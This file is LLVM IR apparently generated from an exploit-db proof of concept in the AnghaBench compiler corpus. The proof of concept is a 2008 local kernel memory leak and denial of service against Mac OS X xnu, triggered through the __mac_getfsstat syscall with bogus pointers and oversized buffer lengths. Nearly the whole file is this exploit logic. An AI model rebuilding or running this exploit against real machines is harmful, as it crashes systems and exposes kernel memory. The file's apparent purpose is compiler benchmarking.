; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_8263.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_8263.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.__mac_getfsstat = type { i8*, i8*, i32, i32, i32 }

@.str = private unnamed_addr constant [142 x i8] c"Apple MACOS X xnu <= 1228.3.13 local kernel memory leak/DoS PoC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@SYS___mac_getfsstat = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"leaked %lu-bytes of kernel memory!\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.__mac_getfsstat, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i32 @printf(i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 @memset(%struct.__mac_getfsstat* %6, i32 0, i32 32)
  %11 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 0
  store i8* inttoptr (i64 3735928559 to i8*), i8** %11, align 8
  %12 = call i32 @LEAK_BUFBYTES(i32 4194304)
  %13 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 4
  store i32 %12, i32* %13, align 8
  %14 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 1
  store i8* inttoptr (i64 3735928559 to i8*), i8** %14, align 8
  %15 = call i32 @LEAK_MACBYTES(i32 4194304)
  %16 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 3
  store i32 %15, i32* %16, align 4
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %39, %2
  %18 = load i32, i32* %7, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %20, label %42

20:                                               ; preds = %17
  %21 = load i32, i32* @SYS___mac_getfsstat, align 4
  %22 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 4
  %25 = load i32, i32* %24, align 8
  %26 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 1
  %27 = load i8*, i8** %26, align 8
  %28 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = getelementptr inbounds %struct.__mac_getfsstat, %struct.__mac_getfsstat* %6, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = call i32 @syscall(i32 %21, i8* %23, i32 %25, i8* %27, i32 %29, i32 %31)
  store i32 %32, i32* %8, align 4
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %34, label %38

34:                                               ; preds = %20
  %35 = load i32, i32* @stderr, align 4
  %36 = call i32 @LEAK_MACBYTES(i32 4194304)
  %37 = call i32 @fprintf(i32 %35, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i32 %36)
  br label %38

38:                                               ; preds = %34, %20
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %7, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %7, align 4
  br label %17

42:                                               ; preds = %17
  %43 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %43
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @memset(%struct.__mac_getfsstat*, i32, i32) #1

declare dso_local i32 @LEAK_BUFBYTES(i32) #1

declare dso_local i32 @LEAK_MACBYTES(i32) #1

declare dso_local i32 @syscall(i32, i8*, i32, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
